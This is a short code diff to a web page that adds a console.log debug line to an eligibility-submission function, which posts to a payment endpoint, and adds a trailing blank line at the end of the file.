@@ -1256,6 +1256,8 @@ async function submitEligibility() {
   showScreen('checkingScreen');
 
             try {
+console.log("submitEligibility triggered");
+              
   const response = await fetch("https://nyotafundke.site/payment.php", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
@@ -1624,5 +1626,6 @@ window.addEventListener('beforeunload', () => {
 </body>
 
 </html>
+
 
 
